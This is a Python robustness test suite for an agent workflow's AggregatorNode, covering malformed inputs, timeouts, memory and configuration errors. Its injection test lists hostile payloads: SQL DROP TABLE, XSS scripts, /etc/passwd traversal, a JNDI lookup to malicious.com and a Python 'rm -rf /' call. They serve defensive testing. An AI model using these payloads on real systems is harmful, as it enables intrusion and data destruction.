#!/usr/bin/env python3
"""
Comprehensive test script for AggregatorNode error handling and edge cases.
This test verifies robustness against various failure scenarios and edge cases.
"""

import os
import sys
import asyncio
import json
import time
import random
from typing import Dict, Any, List
from unittest.mock import Mock, patch
import traceback

# Add the app directory to the Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '.'))

class AggregatorNodeTester:
    """Comprehensive tester for AggregatorNode edge cases and error handling"""
    
    def __init__(self):
        self.executor = None
        self.test_results = []
        self.total_tests = 0
        self.passed_tests = 0
        self.failed_tests = 0
        
    async def initialize_executor(self):
        """Initialize the AgentWorkflowExecutor"""
        try:
            from app.automation.core.agent_workflow_executor import AgentWorkflowExecutor
            self.executor = AgentWorkflowExecutor()
            print("✓ AgentWorkflowExecutor initialized successfully")
            return True
        except Exception as e:
            print(f"✗ Failed to initialize AgentWorkflowExecutor: {e}")
            return False
    
    def add_test_result(self, test_name: str, passed: bool, error: str = None, details: str = None):
        """Add a test result to the results list"""
        self.total_tests += 1
        if passed:
            self.passed_tests += 1
        else:
            self.failed_tests += 1
            
        self.test_results.append({
            "test_name": test_name,
            "passed": passed,
            "error": error,
            "details": details
        })
        
        status = "✓" if passed else "✗"
        print(f"{status} {test_name}")
        if error:
            print(f"  Error: {error}")
        if details:
            print(f"  Details: {details}")
    
    # 1. INPUT VALIDATION TESTS
    async def test_invalid_aggregation_strategies(self):
        """Test behavior with invalid aggregation strategies"""
        print("\n" + "="*50)
        print("1. TESTING INVALID AGGREGATION STRATEGIES")
        print("="*50)
        
        invalid_strategies = [
            "invalid_strategy",
            "",
            None,
            123,
            {"not": "a_string"},
            "nonexistent_strategy"
        ]
        
        for strategy in invalid_strategies:
            try:
                aggregator_config = {
                    "node_id": "test_aggregator",
                    "aggregation_strategy": strategy,
                    "confidence_threshold": 0.3,
                    "fallback_strategy": "return_best"
                }
                
                test_inputs = ["Test input 1", "Test input 2"]
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, test_inputs, 1, "test_exec"
                )
                
                # Should either handle gracefully or use fallback
                if result and not result.get("error"):
                    self.add_test_result(
                        f"Invalid strategy '{strategy}' - Graceful fallback",
                        True,
                        details=f"Strategy used: {result.get('metadata', {}).get('strategy_used', 'unknown')}"
                    )
                else:
                    self.add_test_result(
                        f"Invalid strategy '{strategy}' - Error handling",
                        True,
                        details=f"Error: {result.get('error', 'No error message')}"
                    )
                    
            except Exception as e:
                self.add_test_result(
                    f"Invalid strategy '{strategy}' - Exception handling",
                    False,
                    error=str(e)
                )
    
    async def test_malformed_data_inputs(self):
        """Test behavior with malformed data inputs"""
        print("\n" + "="*50)
        print("2. TESTING MALFORMED DATA INPUTS")
        print("="*50)
        
        malformed_inputs = [
            None,
            "",
            123,
            {"malformed": "object"},
            [None, "", {"nested": None}],
            "{'invalid': 'json'",
            '{"valid": "json", "but": "unexpected_format"}',
            float('inf'),
            float('-inf'),
            float('nan'),
            b'bytes_data',
            complex(1, 2),
            lambda x: x,  # function object
            Exception("test exception"),
            [1, 2, 3, {"mixed": "types"}, None, ""],
            {"deeply": {"nested": {"data": {"with": {"many": {"levels": "value"}}}}}},
            "a" * 10000,  # very long string
            ["item"] * 1000,  # very long list
        ]
        
        for i, malformed_input in enumerate(malformed_inputs):
            try:
                aggregator_config = {
                    "node_id": "test_aggregator",
                    "aggregation_strategy": "semantic_merge",
                    "confidence_threshold": 0.3,
                    "fallback_strategy": "return_best"
                }
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, malformed_input, 1, "test_exec"
                )
                
                if result:
                    self.add_test_result(
                        f"Malformed input {i+1} - Handled gracefully",
                        True,
                        details=f"Input type: {type(malformed_input).__name__}"
                    )
                else:
                    self.add_test_result(
                        f"Malformed input {i+1} - Null result",
                        False,
                        error="Returned None result"
                    )
                    
            except Exception as e:
                self.add_test_result(
                    f"Malformed input {i+1} - Exception raised",
                    False,
                    error=str(e)
                )
    
    async def test_null_and_empty_inputs(self):
        """Test behavior with null and empty inputs"""
        print("\n" + "="*50)
        print("3. TESTING NULL AND EMPTY INPUTS")
        print("="*50)
        
        empty_inputs = [
            None,
            [],
            {},
            "",
            [None],
            [None, None, None],
            ["", "", ""],
            [[], [], []],
            [{}, {}, {}],
        ]
        
        for i, empty_input in enumerate(empty_inputs):
            try:
                aggregator_config = {
                    "node_id": "test_aggregator",
                    "aggregation_strategy": "semantic_merge",
                    "confidence_threshold": 0.3,
                    "fallback_strategy": "empty_result"
                }
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, empty_input, 1, "test_exec"
                )
                
                if result:
                    self.add_test_result(
                        f"Empty input {i+1} - Handled gracefully",
                        True,
                        details=f"Result: {result.get('aggregated_result', 'No result')}"
                    )
                else:
                    self.add_test_result(
                        f"Empty input {i+1} - No result",
                        False,
                        error="Returned None"
                    )
                    
            except Exception as e:
                self.add_test_result(
                    f"Empty input {i+1} - Exception raised",
                    False,
                    error=str(e)
                )
    
    # 2. WORKFLOW STATE ISSUES
    async def test_workflow_state_failures(self):
        """Test handling of workflow state failures"""
        print("\n" + "="*50)
        print("4. TESTING WORKFLOW STATE FAILURES")
        print("="*50)
        
        # Test with invalid workflow_id
        try:
            aggregator_config = {
                "node_id": "test_aggregator",
                "aggregation_strategy": "semantic_merge"
            }
            
            result = await self.executor._process_aggregator_node(
                aggregator_config, ["test input"], -1, "invalid_exec"
            )
            
            self.add_test_result(
                "Invalid workflow_id - Handled gracefully",
                True if result else False,
                error="No result returned" if not result else None
            )
            
        except Exception as e:
            self.add_test_result(
                "Invalid workflow_id - Exception handling",
                False,
                error=str(e)
            )
        
        # Test with None execution_id
        try:
            result = await self.executor._process_aggregator_node(
                aggregator_config, ["test input"], 1, None
            )
            
            self.add_test_result(
                "None execution_id - Handled gracefully",
                True if result else False
            )
            
        except Exception as e:
            self.add_test_result(
                "None execution_id - Exception handling",
                False,
                error=str(e)
            )
    
    async def test_missing_state_properties(self):
        """Test behavior when state properties are missing"""
        print("\n" + "="*50)
        print("5. TESTING MISSING STATE PROPERTIES")
        print("="*50)
        
        incomplete_configs = [
            {},  # completely empty
            {"node_id": "test"},  # missing everything else
            {"aggregation_strategy": "semantic_merge"},  # missing node_id
            {"node_id": "test", "invalid_property": "value"},  # has invalid properties
        ]
        
        for i, config in enumerate(incomplete_configs):
            try:
                result = await self.executor._process_aggregator_node(
                    config, ["test input"], 1, "test_exec"
                )
                
                self.add_test_result(
                    f"Incomplete config {i+1} - Handled gracefully",
                    True if result else False,
                    details=f"Config: {config}"
                )
                
            except Exception as e:
                self.add_test_result(
                    f"Incomplete config {i+1} - Exception handling",
                    False,
                    error=str(e)
                )
    
    # 3. CONNECTION EDGE CASES
    async def test_no_upstream_connections(self):
        """Test behavior with no upstream connections"""
        print("\n" + "="*50)
        print("6. TESTING NO UPSTREAM CONNECTIONS")
        print("="*50)
        
        # Test with empty inputs array
        try:
            aggregator_config = {
                "node_id": "isolated_aggregator",
                "aggregation_strategy": "semantic_merge",
                "fallback_strategy": "empty_result"
            }
            
            result = await self.executor._process_aggregator_node(
                aggregator_config, [], 1, "test_exec"
            )
            
            self.add_test_result(
                "No upstream connections - Empty inputs",
                True if result else False,
                details=f"Result: {result.get('aggregated_result', 'No result') if result else 'None'}"
            )
            
        except Exception as e:
            self.add_test_result(
                "No upstream connections - Exception handling",
                False,
                error=str(e)
            )
    
    async def test_circular_dependencies(self):
        """Test detection/handling of circular dependencies"""
        print("\n" + "="*50)
        print("7. TESTING CIRCULAR DEPENDENCIES")
        print("="*50)
        
        # Create a workflow with circular dependencies
        circular_workflow = {
            "nodes": [
                {
                    "id": "aggregator_1",
                    "type": "AggregatorNode",
                    "data": {
                        "type": "AggregatorNode",
                        "node": {
                            "aggregation_strategy": "semantic_merge"
                        }
                    }
                },
                {
                    "id": "aggregator_2", 
                    "type": "AggregatorNode",
                    "data": {
                        "type": "AggregatorNode",
                        "node": {
                            "aggregation_strategy": "semantic_merge"
                        }
                    }
                }
            ],
            "edges": [
                {
                    "id": "edge_1",
                    "source": "aggregator_1",
                    "target": "aggregator_2"
                },
                {
                    "id": "edge_2",
                    "source": "aggregator_2", 
                    "target": "aggregator_1"
                }
            ]
        }
        
        try:
            agent_plan = self.executor._convert_workflow_to_agent_plan(
                circular_workflow, {"test": "input"}, "test query"
            )
            
            # Check if circular dependency is detected
            has_cycles = len(circular_workflow["edges"]) >= len(circular_workflow["nodes"])
            
            self.add_test_result(
                "Circular dependencies - Detection",
                True,
                details=f"Potential cycles detected: {has_cycles}"
            )
            
        except Exception as e:
            self.add_test_result(
                "Circular dependencies - Exception handling",
                False,
                error=str(e)
            )
    
    async def test_orphaned_nodes(self):
        """Test behavior with orphaned nodes"""
        print("\n" + "="*50)
        print("8. TESTING ORPHANED NODES")
        print("="*50)
        
        # Create workflow with orphaned aggregator
        orphaned_workflow = {
            "nodes": [
                {
                    "id": "connected_agent",
                    "type": "AgentNode",
                    "data": {
                        "type": "AgentNode",
                        "node": {
                            "agent_name": "test_agent"
                        }
                    }
                },
                {
                    "id": "orphaned_aggregator",
                    "type": "AggregatorNode",
                    "data": {
                        "type": "AggregatorNode",
                        "node": {
                            "aggregation_strategy": "semantic_merge"
                        }
                    }
                }
            ],
            "edges": []  # No connections
        }
        
        try:
            agent_plan = self.executor._convert_workflow_to_agent_plan(
                orphaned_workflow, {"test": "input"}, "test query"
            )
            
            # Check if orphaned nodes are detected
            aggregator_nodes = agent_plan.get("aggregator_nodes", [])
            
            self.add_test_result(
                "Orphaned nodes - Detection",
                True,
                details=f"Aggregator nodes found: {len(aggregator_nodes)}"
            )
            
        except Exception as e:
            self.add_test_result(
                "Orphaned nodes - Exception handling",
                False,
                error=str(e)
            )
    
    # 4. TIMEOUT SCENARIOS
    async def test_timeout_handling(self):
        """Test timeout scenarios for long-running aggregations"""
        print("\n" + "="*50)
        print("9. TESTING TIMEOUT SCENARIOS")
        print("="*50)
        
        # Create very large input to simulate long processing
        large_inputs = []
        for i in range(100):
            large_inputs.append("This is a very long input string that contains lots of text and should take some time to process. " * 100)
        
        try:
            aggregator_config = {
                "node_id": "timeout_test_aggregator",
                "aggregation_strategy": "semantic_merge",
                "max_inputs": 50,  # Limit to prevent excessive processing
                "confidence_threshold": 0.1
            }
            
            start_time = time.time()
            result = await self.executor._process_aggregator_node(
                aggregator_config, large_inputs, 1, "test_exec"
            )
            processing_time = time.time() - start_time
            
            self.add_test_result(
                "Large input processing - Performance",
                True if result else False,
                details=f"Processing time: {processing_time:.2f}s, Inputs: {len(large_inputs)}"
            )
            
        except Exception as e:
            self.add_test_result(
                "Large input processing - Exception handling",
                False,
                error=str(e)
            )
    
    async def test_async_timeout_behavior(self):
        """Test async timeout behavior"""
        print("\n" + "="*50)
        print("10. TESTING ASYNC TIMEOUT BEHAVIOR")
        print("="*50)
        
        try:
            # Test with timeout wrapper
            async def timeout_test():
                aggregator_config = {
                    "node_id": "async_timeout_test",
                    "aggregation_strategy": "semantic_merge"
                }
                
                return await self.executor._process_aggregator_node(
                    aggregator_config, ["test input"], 1, "test_exec"
                )
            
            # Test with very short timeout
            try:
                result = await asyncio.wait_for(timeout_test(), timeout=0.001)
                self.add_test_result(
                    "Async timeout - Completed within timeout",
                    True,
                    details="Processing completed quickly"
                )
            except asyncio.TimeoutError:
                self.add_test_result(
                    "Async timeout - Timeout handling",
                    True,
                    details="Timeout occurred as expected"
                )
            
        except Exception as e:
            self.add_test_result(
                "Async timeout - Exception handling",
                False,
                error=str(e)
            )
    
    # 5. MEMORY LIMITS
    async def test_memory_limits(self):
        """Test memory management with large input collections"""
        print("\n" + "="*50)
        print("11. TESTING MEMORY LIMITS")
        print("="*50)
        
        # Test with very large number of inputs
        try:
            large_input_count = 1000
            memory_test_inputs = [f"Input {i}: " + "data " * 100 for i in range(large_input_count)]
            
            aggregator_config = {
                "node_id": "memory_test_aggregator",
                "aggregation_strategy": "simple_concatenate",
                "max_inputs": 100,  # Limit to prevent memory issues
                "confidence_threshold": 0.1
            }
            
            result = await self.executor._process_aggregator_node(
                aggregator_config, memory_test_inputs, 1, "test_exec"
            )
            
            if result:
                inputs_processed = result.get("metadata", {}).get("inputs_processed", 0)
                self.add_test_result(
                    "Large input collection - Memory management",
                    True,
                    details=f"Processed {inputs_processed} out of {large_input_count} inputs"
                )
            else:
                self.add_test_result(
                    "Large input collection - No result",
                    False,
                    error="No result returned"
                )
                
        except Exception as e:
            self.add_test_result(
                "Large input collection - Exception handling",
                False,
                error=str(e)
            )
    
    async def test_memory_cleanup(self):
        """Test memory cleanup after processing"""
        print("\n" + "="*50)
        print("12. TESTING MEMORY CLEANUP")
        print("="*50)
        
        try:
            # Process multiple aggregations to test memory cleanup
            for i in range(10):
                aggregator_config = {
                    "node_id": f"cleanup_test_{i}",
                    "aggregation_strategy": "semantic_merge"
                }
                
                test_inputs = [f"Test input {j}" for j in range(50)]
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, test_inputs, 1, f"test_exec_{i}"
                )
                
                if not result:
                    self.add_test_result(
                        f"Memory cleanup - Iteration {i+1}",
                        False,
                        error="No result returned"
                    )
                    return
            
            self.add_test_result(
                "Memory cleanup - Multiple iterations",
                True,
                details="All iterations completed successfully"
            )
            
        except Exception as e:
            self.add_test_result(
                "Memory cleanup - Exception handling",
                False,
                error=str(e)
            )
    
    # 6. CONFIGURATION ERRORS
    async def test_invalid_quality_weights(self):
        """Test behavior with invalid quality weights"""
        print("\n" + "="*50)
        print("13. TESTING INVALID QUALITY WEIGHTS")
        print("="*50)
        
        invalid_weights = [
            None,
            "invalid",
            123,
            [],
            {"length": "invalid"},
            {"length": -1, "coherence": 0.5},
            {"length": float('inf'), "coherence": 0.5},
            {"length": float('nan'), "coherence": 0.5},
            {"invalid_key": 0.5},
            {},  # empty weights
        ]
        
        for i, weights in enumerate(invalid_weights):
            try:
                aggregator_config = {
                    "node_id": "weights_test_aggregator",
                    "aggregation_strategy": "weighted_vote",
                    "quality_weights": weights
                }
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, ["test input 1", "test input 2"], 1, "test_exec"
                )
                
                self.add_test_result(
                    f"Invalid quality weights {i+1} - Handled gracefully",
                    True if result else False,
                    details=f"Weights: {weights}"
                )
                
            except Exception as e:
                self.add_test_result(
                    f"Invalid quality weights {i+1} - Exception handling",
                    False,
                    error=str(e)
                )
    
    async def test_invalid_threshold_values(self):
        """Test behavior with invalid threshold values"""
        print("\n" + "="*50)
        print("14. TESTING INVALID THRESHOLD VALUES")
        print("="*50)
        
        invalid_thresholds = [
            -1,
            2.0,
            float('inf'),
            float('-inf'),
            float('nan'),
            "invalid",
            None,
            [],
            {},
        ]
        
        for i, threshold in enumerate(invalid_thresholds):
            try:
                aggregator_config = {
                    "node_id": "threshold_test_aggregator",
                    "aggregation_strategy": "confidence_filter",
                    "confidence_threshold": threshold
                }
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, ["test input 1", "test input 2"], 1, "test_exec"
                )
                
                self.add_test_result(
                    f"Invalid threshold {i+1} - Handled gracefully",
                    True if result else False,
                    details=f"Threshold: {threshold}"
                )
                
            except Exception as e:
                self.add_test_result(
                    f"Invalid threshold {i+1} - Exception handling",
                    False,
                    error=str(e)
                )
    
    async def test_missing_required_properties(self):
        """Test behavior when required properties are missing"""
        print("\n" + "="*50)
        print("15. TESTING MISSING REQUIRED PROPERTIES")
        print("="*50)
        
        incomplete_configs = [
            {},  # missing node_id
            {"aggregation_strategy": "semantic_merge"},  # missing node_id
            {"node_id": "test"},  # missing aggregation_strategy
            {"node_id": "test", "aggregation_strategy": None},  # null strategy
        ]
        
        for i, config in enumerate(incomplete_configs):
            try:
                result = await self.executor._process_aggregator_node(
                    config, ["test input"], 1, "test_exec"
                )
                
                # Should handle missing properties gracefully
                self.add_test_result(
                    f"Missing properties {i+1} - Graceful handling",
                    True if result else False,
                    details=f"Config: {config}"
                )
                
            except Exception as e:
                self.add_test_result(
                    f"Missing properties {i+1} - Exception handling",
                    False,
                    error=str(e)
                )
    
    # 7. BACKEND INTEGRATION FAILURES
    async def test_database_errors(self):
        """Test behavior during database errors"""
        print("\n" + "="*50)
        print("16. TESTING DATABASE ERRORS")
        print("="*50)
        
        # Mock database failure
        original_method = None
        try:
            # Try to mock a database-related method if it exists
            if hasattr(self.executor, '_get_workflow_state'):
                original_method = self.executor._get_workflow_state
                self.executor._get_workflow_state = Mock(side_effect=Exception("Database connection failed"))
            
            aggregator_config = {
                "node_id": "db_error_test",
                "aggregation_strategy": "semantic_merge"
            }
            
            result = await self.executor._process_aggregator_node(
                aggregator_config, ["test input"], 1, "test_exec"
            )
            
            self.add_test_result(
                "Database error - Handled gracefully",
                True if result else False,
                details="Database error simulation completed"
            )
            
        except Exception as e:
            self.add_test_result(
                "Database error - Exception handling",
                False,
                error=str(e)
            )
        finally:
            # Restore original method
            if original_method and hasattr(self.executor, '_get_workflow_state'):
                self.executor._get_workflow_state = original_method
    
    async def test_api_failures(self):
        """Test behavior during API failures"""
        print("\n" + "="*50)
        print("17. TESTING API FAILURES")
        print("="*50)
        
        # Mock API failure for AI-based aggregation
        try:
            # Test with AI-dependent strategy
            aggregator_config = {
                "node_id": "api_failure_test",
                "aggregation_strategy": "semantic_merge",
                "semantic_analysis": True,
                "fallback_strategy": "simple_merge"
            }
            
            result = await self.executor._process_aggregator_node(
                aggregator_config, ["test input 1", "test input 2"], 1, "test_exec"
            )
            
            self.add_test_result(
                "API failure - Fallback handling",
                True if result else False,
                details="API failure simulation completed"
            )
            
        except Exception as e:
            self.add_test_result(
                "API failure - Exception handling",
                False,
                error=str(e)
            )
    
    async def test_service_unavailability(self):
        """Test behavior when services are unavailable"""
        print("\n" + "="*50)
        print("18. TESTING SERVICE UNAVAILABILITY")
        print("="*50)
        
        try:
            # Test with configuration that might depend on external services
            aggregator_config = {
                "node_id": "service_unavailable_test",
                "aggregation_strategy": "semantic_merge",
                "semantic_analysis": True,
                "fallback_strategy": "return_best"
            }
            
            result = await self.executor._process_aggregator_node(
                aggregator_config, ["test input"], 1, "test_exec"
            )
            
            self.add_test_result(
                "Service unavailability - Handled gracefully",
                True if result else False,
                details="Service unavailability simulation completed"
            )
            
        except Exception as e:
            self.add_test_result(
                "Service unavailability - Exception handling",
                False,
                error=str(e)
            )
    
    # 8. SECURITY VULNERABILITY TESTS
    async def test_injection_attacks(self):
        """Test resistance to injection attacks"""
        print("\n" + "="*50)
        print("19. TESTING INJECTION ATTACKS")
        print("="*50)
        
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://malicious.com/a}",
            "{{7*7}}",
            "#{7*7}",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "eval('alert(\"XSS\")')",
            "__import__('os').system('rm -rf /')",
        ]
        
        for i, malicious_input in enumerate(malicious_inputs):
            try:
                aggregator_config = {
                    "node_id": "injection_test",
                    "aggregation_strategy": "semantic_merge"
                }
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, [malicious_input], 1, "test_exec"
                )
                
                # Should handle malicious input safely
                if result and not result.get("error"):
                    # Check if malicious input is sanitized in output
                    output = result.get("aggregated_result", "")
                    is_safe = not any(dangerous in str(output) for dangerous in ["<script>", "eval(", "DROP TABLE"])
                    
                    self.add_test_result(
                        f"Injection attack {i+1} - Safe handling",
                        is_safe,
                        details=f"Input sanitized: {is_safe}"
                    )
                else:
                    self.add_test_result(
                        f"Injection attack {i+1} - Error handling",
                        True,
                        details="Potentially dangerous input rejected"
                    )
                    
            except Exception as e:
                self.add_test_result(
                    f"Injection attack {i+1} - Exception handling",
                    False,
                    error=str(e)
                )
    
    async def test_resource_exhaustion(self):
        """Test resistance to resource exhaustion attacks"""
        print("\n" + "="*50)
        print("20. TESTING RESOURCE EXHAUSTION")
        print("="*50)
        
        try:
            # Test with very large inputs designed to exhaust resources
            resource_exhaustion_inputs = [
                "A" * 1000000,  # Very long string
                ["item"] * 10000,  # Very long list
                [{"key": "value" * 1000} for _ in range(1000)],  # Large object list
            ]
            
            for i, exhaustion_input in enumerate(resource_exhaustion_inputs):
                try:
                    aggregator_config = {
                        "node_id": "resource_exhaustion_test",
                        "aggregation_strategy": "simple_concatenate",
                        "max_inputs": 100,  # Limit to prevent exhaustion
                    }
                    
                    start_time = time.time()
                    result = await self.executor._process_aggregator_node(
                        aggregator_config, exhaustion_input, 1, "test_exec"
                    )
                    processing_time = time.time() - start_time
                    
                    # Should complete in reasonable time
                    time_reasonable = processing_time < 30  # 30 seconds max
                    
                    self.add_test_result(
                        f"Resource exhaustion {i+1} - Protected",
                        time_reasonable,
                        details=f"Processing time: {processing_time:.2f}s"
                    )
                    
                except Exception as e:
                    self.add_test_result(
                        f"Resource exhaustion {i+1} - Exception handling",
                        False,
                        error=str(e)
                    )
                    
        except Exception as e:
            self.add_test_result(
                "Resource exhaustion - General exception",
                False,
                error=str(e)
            )
    
    async def test_all_fallback_strategies(self):
        """Test all fallback strategies under error conditions"""
        print("\n" + "="*50)
        print("21. TESTING ALL FALLBACK STRATEGIES")
        print("="*50)
        
        fallback_strategies = [
            "return_best",
            "simple_merge", 
            "error",
            "empty_result"
        ]
        
        for strategy in fallback_strategies:
            try:
                aggregator_config = {
                    "node_id": "fallback_test",
                    "aggregation_strategy": "invalid_strategy",  # Force fallback
                    "fallback_strategy": strategy,
                    "confidence_threshold": 0.9  # High threshold to trigger fallback
                }
                
                result = await self.executor._process_aggregator_node(
                    aggregator_config, ["low quality input"], 1, "test_exec"
                )
                
                if strategy == "error":
                    # Should return error
                    has_error = result and result.get("error")
                    self.add_test_result(
                        f"Fallback strategy '{strategy}' - Error returned",
                        has_error,
                        details=f"Error: {result.get('error', 'No error') if result else 'No result'}"
                    )
                elif strategy == "empty_result":
                    # Should return empty result
                    is_empty = result and result.get("aggregated_result") == ""
                    self.add_test_result(
                        f"Fallback strategy '{strategy}' - Empty result",
                        is_empty,
                        details=f"Result: '{result.get('aggregated_result', 'No result') if result else 'No result'}'"
                    )
                else:
                    # Should return some result
                    has_result = result and result.get("aggregated_result")
                    self.add_test_result(
                        f"Fallback strategy '{strategy}' - Result returned",
                        has_result,
                        details=f"Result length: {len(str(result.get('aggregated_result', ''))) if result else 0}"
                    )
                    
            except Exception as e:
                self.add_test_result(
                    f"Fallback strategy '{strategy}' - Exception handling",
                    False,
                    error=str(e)
                )
    
    def print_summary(self):
        """Print comprehensive test summary"""
        print("\n" + "="*80)
        print("AGGREGATOR NODE EDGE CASE TESTING - FINAL SUMMARY")
        print("="*80)
        
        print(f"Total Tests Run: {self.total_tests}")
        print(f"Passed: {self.passed_tests}")
        print(f"Failed: {self.failed_tests}")
        print(f"Success Rate: {(self.passed_tests/self.total_tests)*100:.1f}%" if self.total_tests > 0 else "N/A")
        
        print("\n" + "="*80)
        print("DETAILED TEST RESULTS BY CATEGORY")
        print("="*80)
        
        # Group results by category
        categories = {
            "Input Validation": [1, 2, 3],
            "Workflow State": [4, 5],
            "Connection Edge Cases": [6, 7, 8],
            "Timeout Scenarios": [9, 10],
            "Memory Limits": [11, 12],
            "Configuration Errors": [13, 14, 15],
            "Backend Integration": [16, 17, 18],
            "Security & Robustness": [19, 20, 21]
        }
        
        for category, test_numbers in categories.items():
            print(f"\n{category}:")
            print("-" * len(category))
            
            category_tests = [r for r in self.test_results if any(str(num) in r['test_name'] for num in test_numbers)]
            category_passed = len([r for r in category_tests if r['passed']])
            category_total = len(category_tests)
            
            if category_total > 0:
                print(f"  {category_passed}/{category_total} tests passed ({(category_passed/category_total)*100:.1f}%)")
                
                # Show failed tests
                failed_tests = [r for r in category_tests if not r['passed']]
                if failed_tests:
                    print("  Failed tests:")
                    for test in failed_tests:
                        print(f"    - {test['test_name']}: {test['error']}")
            else:
                print("  No tests found for this category")
        
        print("\n" + "="*80)
        print("SECURITY VULNERABILITY ASSESSMENT")
        print("="*80)
        
        # Security-specific analysis
        security_tests = [r for r in self.test_results if 'injection' in r['test_name'].lower() or 'exhaustion' in r['test_name'].lower()]
        if security_tests:
            security_passed = len([r for r in security_tests if r['passed']])
            security_total = len(security_tests)
            print(f"Security Tests: {security_passed}/{security_total} passed")
            
            if security_passed == security_total:
                print("✓ NO SECURITY VULNERABILITIES DETECTED")
            else:
                print("⚠ POTENTIAL SECURITY VULNERABILITIES FOUND")
                failed_security = [r for r in security_tests if not r['passed']]
                for test in failed_security:
                    print(f"  - {test['test_name']}: {test['error']}")
        
        print("\n" + "="*80)
        print("ROBUSTNESS ASSESSMENT")
        print("="*80)
        
        # Calculate robustness score
        error_handling_tests = [r for r in self.test_results if 'exception handling' in r['test_name'].lower()]
        graceful_handling_tests = [r for r in self.test_results if 'graceful' in r['test_name'].lower()]
        
        robustness_score = 0
        if self.total_tests > 0:
            robustness_score = (self.passed_tests / self.total_tests) * 100
        
        print(f"Overall Robustness Score: {robustness_score:.1f}%")
        
        if robustness_score >= 90:
            print("✓ EXCELLENT - AggregatorNode shows high robustness")
        elif robustness_score >= 75:
            print("✓ GOOD - AggregatorNode shows acceptable robustness")
        elif robustness_score >= 60:
            print("⚠ MODERATE - AggregatorNode needs improvement")
        else:
            print("✗ POOR - AggregatorNode has significant robustness issues")
        
        print("\n" + "="*80)
        print("RECOMMENDATIONS")
        print("="*80)
        
        recommendations = []
        
        # Analyze failure patterns
        if self.failed_tests > 0:
            failure_rate = (self.failed_tests / self.total_tests) * 100
            if failure_rate > 25:
                recommendations.append("- Improve general error handling and input validation")
            
            # Check for specific failure patterns
            error_types = {}
            for test in self.test_results:
                if not test['passed'] and test['error']:
                    error_type = test['error'].split(':')[0] if ':' in test['error'] else test['error']
                    error_types[error_type] = error_types.get(error_type, 0) + 1
            
            if error_types:
                most_common_error = max(error_types.items(), key=lambda x: x[1])
                recommendations.append(f"- Address recurring error pattern: {most_common_error[0]} ({most_common_error[1]} occurrences)")
        
        # Check for missing security features
        injection_tests = [r for r in self.test_results if 'injection' in r['test_name'].lower()]
        if injection_tests and not all(r['passed'] for r in injection_tests):
            recommendations.append("- Implement input sanitization to prevent injection attacks")
        
        resource_tests = [r for r in self.test_results if 'exhaustion' in r['test_name'].lower()]
        if resource_tests and not all(r['passed'] for r in resource_tests):
            recommendations.append("- Add resource limits to prevent exhaustion attacks")
        
        # Check for performance issues
        timeout_tests = [r for r in self.test_results if 'timeout' in r['test_name'].lower()]
        if timeout_tests and not all(r['passed'] for r in timeout_tests):
            recommendations.append("- Optimize performance for large input processing")
        
        if not recommendations:
            recommendations.append("- No critical issues found. Consider regular security audits.")
        
        for rec in recommendations:
            print(rec)
        
        print("\n" + "="*80)
        print("TEST COMPLETED")
        print("="*80)

async def main():
    """Main test execution function"""
    print("AGGREGATOR NODE COMPREHENSIVE EDGE CASE TESTING")
    print("="*80)
    print("This test suite verifies AggregatorNode robustness against:")
    print("- Input validation failures")
    print("- Workflow state issues")
    print("- Connection edge cases")
    print("- Timeout scenarios")
    print("- Memory limits")
    print("- Configuration errors")
    print("- Backend integration failures")
    print("- Security vulnerabilities")
    print("="*80)
    
    tester = AggregatorNodeTester()
    
    # Initialize
    if not await tester.initialize_executor():
        print("✗ Cannot proceed without AgentWorkflowExecutor")
        return
    
    # Run all test categories
    try:
        # 1. Input Validation Tests
        await tester.test_invalid_aggregation_strategies()
        await tester.test_malformed_data_inputs()
        await tester.test_null_and_empty_inputs()
        
        # 2. Workflow State Tests
        await tester.test_workflow_state_failures()
        await tester.test_missing_state_properties()
        
        # 3. Connection Edge Cases
        await tester.test_no_upstream_connections()
        await tester.test_circular_dependencies()
        await tester.test_orphaned_nodes()
        
        # 4. Timeout Scenarios
        await tester.test_timeout_handling()
        await tester.test_async_timeout_behavior()
        
        # 5. Memory Limits
        await tester.test_memory_limits()
        await tester.test_memory_cleanup()
        
        # 6. Configuration Errors
        await tester.test_invalid_quality_weights()
        await tester.test_invalid_threshold_values()
        await tester.test_missing_required_properties()
        
        # 7. Backend Integration Failures
        await tester.test_database_errors()
        await tester.test_api_failures()
        await tester.test_service_unavailability()
        
        # 8. Security & Robustness
        await tester.test_injection_attacks()
        await tester.test_resource_exhaustion()
        await tester.test_all_fallback_strategies()
        
    except Exception as e:
        print(f"✗ Test execution failed: {e}")
        traceback.print_exc()
    
    # Print comprehensive summary
    tester.print_summary()

if __name__ == "__main__":
    asyncio.run(main())